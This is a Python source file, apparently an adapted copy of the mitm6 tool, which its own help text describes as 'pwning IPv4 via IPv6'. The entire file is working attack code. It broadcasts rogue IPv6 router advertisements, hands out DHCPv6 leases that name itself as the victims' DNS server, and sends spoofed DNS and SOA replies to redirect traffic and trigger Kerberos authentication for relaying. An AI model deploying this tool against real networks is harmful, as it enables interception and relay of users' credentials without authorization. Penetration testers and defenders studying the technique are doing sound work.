from __future__ import unicode_literals
from scapy.all import sniff, ls, ARP, IPv6, DNS, DNSRR, Ether, conf, IP, UDP, DNSRRSOA
from twisted.internet import reactor
from twisted.internet.protocol import ProcessProtocol, DatagramProtocol
from scapy.layers.dhcp6 import *
from scapy.layers.inet6 import ICMPv6ND_RA
from scapy.sendrecv import sendp
from twisted.internet import task, threads
from builtins import str
import os
import json
import random
import ipaddress
import netifaces
import sys
import argparse
import socket
import builtins

pcdict = {}
arptable = {}
try:
    with open('arp.cache', 'r') as arpcache:
        arptable = json.load(arpcache)
except IOError:
    pass

class Config(object):
    def __init__(self, args):
        if args.interface is None:
            self.dgw = netifaces.gateways()['default']
            self.default_if = self.dgw[netifaces.AF_INET][1]
        else:
            self.default_if = args.interface
        if args.ipv4 is None:
            self.v4addr = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET][0]['addr']
        else:
            self.v4addr = args.ipv4
        if args.ipv6 is None:
            try:
                self.v6addr = None
                addrs = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET6]
                for addr in addrs:
                    if 'fe80::' in addr['addr']:
                        self.v6addr = addr['addr']
            except KeyError:
                self.v6addr = None
            if not self.v6addr:
                #print('Error: The interface {0} does not have an IPv6 link-local address assigned. Make sure IPv6 is activated on this interface.'.format(self.default_if))
                sys.exit(1)
        else:
            self.v6addr = args.ipv6
        if args.mac is None:
            self.macaddr = netifaces.ifaddresses(self.default_if)[netifaces.AF_LINK][0]['addr']
        else:
            self.macaddr = args.mac

        if '%' in self.v6addr:
            self.v6addr = self.v6addr[:self.v6addr.index('%')]

        self.ipv6prefix = 'fe80::' #link-local
        self.selfaddr = self.v6addr
        self.selfmac = self.macaddr
        self.ipv6cidr = '64'
        self.selfipv4 = self.v4addr
        self.selfduid = DUID_LL(lladdr = self.macaddr)
        self.selfptr = ipaddress.ip_address(str(self.selfaddr)).reverse_pointer + '.'
        self.ipv6noaddr = random.randint(1,9999)
        self.ipv6noaddrc = 1
        if args.relay:
            self.relay = args.relay.lower()
        else:
            self.relay = None

        self.dns_allowlist = [d.lower() for d in args.domain]
        self.dns_blocklist = [d.lower() for d in args.blocklist]
        self.host_allowlist = [d.lower() for d in args.host_allowlist]
        self.host_blocklist = [d.lower() for d in args.host_blocklist]
        self.ignore_nofqdn = args.ignore_nofqdn
        if args.localdomain is None:
            try:
                self.localdomain = args.domain[0]
            except IndexError:
                self.localdomain = None
        else:
            self.localdomain = args.localdomain.lower()

        self.debug = args.debug
        self.verbose = args.verbose

class Target(object):
    def __init__(self, mac, host, ipv4=None):
        self.mac = mac
        try:
            self.host = host.decode("utf-8")
        except builtins.AttributeError:
            self.host = host
        if ipv4 is not None:
            self.ipv4 = ipv4
        else:
            try:
                self.ipv4 = arptable[mac]
            except KeyError:
                self.ipv4 = ''

    def __str__(self):
        return 'mac=%s host=%s ipv4=%s' % (self.mac, str(self.host), self.ipv4)

    def __repr__(self):
        return '<Target %s>' % self.__str__()

def get_fqdn(dhcp6packet):
    try:
        fqdn = dhcp6packet[DHCP6OptClientFQDN].fqdn
        if fqdn[-1] == '.':
            return fqdn[:-1]
        else:
            return fqdn

    except KeyError:
        return ''

def send_dhcp_advertise(p, basep, target):
    global ipv6noaddrc
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
    resp /= DHCP6_Advertise(trid=p.trid)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
    if config.localdomain:
        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
    if target.ipv4 != '':
        addr = config.ipv6prefix + target.ipv4.replace('.', ':')
    else:
        addr = config.ipv6prefix + '%d:%d' % (config.ipv6noaddr, config.ipv6noaddrc)
        config.ipv6noaddrc += 1
    opt = DHCP6OptIAAddress(preflft=300, validlft=300, addr=addr)
    resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
    sendp(resp, iface=config.default_if, verbose=False)

def send_dhcp_reply(p, basep):
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
    resp /= DHCP6_Reply(trid=p.trid)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
    if config.localdomain:
        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
    try:
        opt = p[DHCP6OptIAAddress]
        resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
        sendp(resp, iface=config.default_if, verbose=False)
    except IndexError:
        if config.debug or config.verbose:
            pass

def send_dns_reply(p):
    if IPv6 in p:
        ip = p[IPv6]
        resp = Ether(dst=p.src, src=p.dst)/IPv6(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
    else:
        ip = p[IP]
        resp = Ether(dst=p.src, src=p.dst)/IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
    dns = p[DNS]
    if dns.qd.qclass != 1 or dns.qr != 0:
        return
    reqname = dns.qd.qname.decode()
    if dns.qd.qtype == 1:
        rdata = config.selfipv4
    elif dns.qd.qtype == 28:
        rdata = config.selfaddr
    elif dns.qd.qtype == 12:
        return
        if reqname == config.selfptr:
            rdata = 'attacker.%s' % config.localdomain
        else:
            return
    elif dns.qd.qtype == 6 and config.relay:
        if dns.opcode == 5:
            if config.verbose or config.debug:
                pass
                #print('Dynamic update found, refusing it to trigger auth')
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, ns=dns.ns, opcode=5, rcode=5)
            sendp(resp, verbose=False)
        else:
            rdata = config.selfaddr
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, nscount=1, arcount=1, ancount=1, an=DNSRRSOA(rrname=dns.qd.qname, ttl=100, mname="%s." % config.relay, rname="mitm6", serial=1337, type=dns.qd.qtype),
                        ns=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.relay, type=2),
                        ar=DNSRR(rrname=config.relay, type=1, rclass=1, ttl=300, rdata=config.selfipv4))
            sendp(resp, verbose=False)
            if config.verbose or config.debug:
                pass
                #print('Sent SOA reply')
        return
    else:
        return
    if should_spoof_dns(reqname):
        resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
        try:
            sendp(resp, iface=config.default_if, verbose=False)
        except socket.error as e:
            print(e)
            if config.debug:
                ls(resp)
        file = open('./logs/debug_log.log','a')
        file.write('\n[*] [MITM6] Sent spoofed reply for %s to %s' % (reqname, ip.src))
        file.close()
    else:
        if config.verbose or config.debug:
            pass

def matches_list(value, target_list):
    testvalue = value.lower()
    for test in target_list:
        if test in testvalue:
            return True
    return False

def should_spoof_dns(dnsname):
    if config.dns_allowlist and not matches_list(dnsname, config.dns_allowlist):
        return False
    if matches_list(dnsname, config.dns_blocklist):
        return False
    return True

def should_spoof_dhcpv6(fqdn):
    if not fqdn:
        return not config.ignore_nofqdn
    if config.host_allowlist and not matches_list(fqdn, config.host_allowlist):
        if config.debug:
            pass
        return False
    if matches_list(fqdn, config.host_blocklist):
        if config.debug:
            pass
        return False
    return True

def get_target(p):
    mac = p.src
    try:
        return pcdict[mac]
    except KeyError:
        try:
            fqdn = get_fqdn(p)
        except IndexError:
            fqdn = ''
        pcdict[mac] = Target(mac,fqdn)
        return pcdict[mac]

def parsepacket(p):
    if DHCP6_Solicit in p:
        target = get_target(p)
        if should_spoof_dhcpv6(target.host):
            send_dhcp_advertise(p[DHCP6_Solicit], p, target)
    if DHCP6_Request in p:
        target = get_target(p)
        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
            send_dhcp_reply(p[DHCP6_Request], p)
            file = open('./logs/debug_log.log','a')
            file.write('\n[*] [MITM6] IPv6 address %s is now assigned to %s' % (p[DHCP6OptIA_NA].ianaopts[0].addr, pcdict[p.src]))
            file.close()
    if DHCP6_Renew in p:
        target = get_target(p)
        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
            send_dhcp_reply(p[DHCP6_Renew],p)
            file = open('./logs/debug_log.log','a')
            file.write('\n[*] [MITM6] Renew reply sent to %s' % p[DHCP6OptIA_NA].ianaopts[0].addr)
            file.close()
    if ARP in p:
        arpp = p[ARP]
        if arpp.op == 2:
            arptable[arpp.hwsrc] = arpp.psrc
    if DNS in p:
        if p.dst == config.selfmac:
            send_dns_reply(p)

def setupFakeDns():
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    fulladdr = config.v6addr+ '%' + config.default_if
    addrinfo = socket.getaddrinfo(fulladdr, 53, socket.AF_INET6, socket.SOCK_DGRAM)
    sock.bind(addrinfo[0][4])
    sock.setblocking(0)
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fulladdr = config.v4addr
    addrinfo = socket.getaddrinfo(fulladdr, 53, socket.AF_INET, socket.SOCK_DGRAM)
    sock2.bind(addrinfo[0][4])
    sock2.setblocking(0)
    return sock, sock2

def send_ra():
    p = Ether(src=config.selfmac, dst='33:33:00:00:00:01')/IPv6(src=config.selfaddr, dst='ff02::1')/ICMPv6ND_RA(M=1, O=1, routerlifetime=0)
    sendp(p, iface=config.default_if, verbose=False)

def should_stop(_):
    return not reactor.running

def shutdownnotice():
    print('')
    file = open('./logs/debug_log.log','a')
    file.write('\n[*] [MITM6] Shutting down packet capture after next packet...')
    file.close()

def print_err(failure):
    pass
    #print('An error occurred while sending a packet: %s\nNote that root privileges are required to run mitm6' % failure.getErrorMessage())

def main(intf):
    global config
    parser = argparse.ArgumentParser(description='mitm6 - pwning IPv4 via IPv6\nFor help or reporting issues, visit https://github.com/dirkjanm/mitm6', formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-i", "--interface", type=str, metavar='INTERFACE', help="Interface to use (default: autodetect)",default=intf)
    parser.add_argument("-l", "--localdomain", type=str, metavar='LOCALDOMAIN', help="Domain name to use as DNS search domain (default: use first DNS domain)")
    parser.add_argument("-4", "--ipv4", type=str, metavar='ADDRESS', help="IPv4 address to send packets from (default: autodetect)")
    parser.add_argument("-6", "--ipv6", type=str, metavar='ADDRESS', help="IPv6 link-local address to send packets from (default: autodetect)")
    parser.add_argument("-m", "--mac", type=str, metavar='ADDRESS', help="Custom mac address - probably breaks stuff (default: mac of selected interface)")
    parser.add_argument("-a", "--no-ra", action='store_true', help="Do not advertise ourselves (useful for networks which detect rogue Router Advertisements)")
    parser.add_argument("-r", "--relay", type=str, metavar='TARGET', help="Authentication relay target, will be used as fake DNS server hostname to trigger Kerberos auth")
    parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
    parser.add_argument("--debug", action='store_true', help="Show debug information")

    filtergroup = parser.add_argument_group("Filtering options")
    filtergroup.add_argument("-d", "--domain", action='append', metavar='DOMAIN', help="Domain name to filter DNS queries on (Allowlist principle, multiple can be specified.)",default=[])
    filtergroup.add_argument("-b", "--blocklist", "--blacklist", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Blocklist principle, multiple can be specified.)")
    filtergroup.add_argument("-hw", "-ha", "--host-allowlist", "--host-whitelist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Allowlist principle, multiple can be specified.)")
    filtergroup.add_argument("-hb", "--host-blocklist", "--host-blacklist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Blocklist principle, multiple can be specified.)")
    filtergroup.add_argument("--ignore-nofqdn", action='store_true', help="Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.")

    args = parser.parse_args()
    config = Config(args)

    print('-->[+] Starting mitm6 | Adapter: %s [%s] | IPv4 Address: %s | IPv6 Address: %s' % (config.default_if, config.selfmac,config.selfipv4,config.selfaddr))
    if config.localdomain is not None:
        pass
    if not config.dns_allowlist and not config.dns_blocklist:
        pass
    else:
        if not config.dns_allowlist:
            pass
        else:
            if config.relay and len([matching for matching in config.dns_allowlist if matching in config.relay]) == 0:
                pass
        if config.dns_blocklist:
            pass
    if config.host_allowlist:
        pass
    if config.host_blocklist:
        pass

    d = threads.deferToThread(sniff, iface=config.default_if, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x), stop_filter=should_stop)
    d.addErrback(print_err)

    if not args.no_ra:
        loop = task.LoopingCall(send_ra)
        d = loop.start(30.0)
        d.addErrback(print_err)

    dnssock, dnssock2 = setupFakeDns()
    reactor.adoptDatagramPort(dnssock.fileno(), socket.AF_INET6, DatagramProtocol())
    reactor.adoptDatagramPort(dnssock2.fileno(), socket.AF_INET, DatagramProtocol())

    reactor.addSystemEventTrigger('before', 'shutdown', shutdownnotice)
    reactor.run()

if __name__ == '__main__':
    main()
